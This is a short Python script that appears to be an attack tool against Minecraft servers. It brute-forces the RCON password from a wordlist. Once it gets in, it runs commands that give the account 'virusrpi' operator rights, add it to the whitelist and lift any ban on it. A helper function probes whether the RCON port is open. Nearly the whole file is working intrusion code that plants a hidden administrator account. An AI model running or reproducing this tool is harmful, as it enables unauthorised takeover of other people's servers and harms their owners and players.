import mcrcon


def rcon(host='localhost', port=25575, wordlist_path='passwords.txt'):
    with open(wordlist_path, encoding="utf-8", errors="ignore") as f:
        passwords = f.readlines()

    plen = len(passwords)
    password = None

    for i, p in enumerate(passwords):
        try:
            with mcrcon.MCRcon(host, p, port) as mr:
                print(mr.command("op virusrpi"))
                print(mr.command("whitelist add virusrpi"))
                print(mr.command("pardon virusrpi"))
            password = p
            break
        except Exception as e:
            print(e)

    if password is None:
        return

    return password


def check(host="localhost", port=25575):
    try:
        mr = mcrcon.MCRcon(host, "password", port)
        mr.connect()
        mr.disconnect()
        return True
    except mcrcon.MCRconException:
        return True
    except ConnectionRefusedError:
        return False


if __name__ == '__main__':
    print(check())
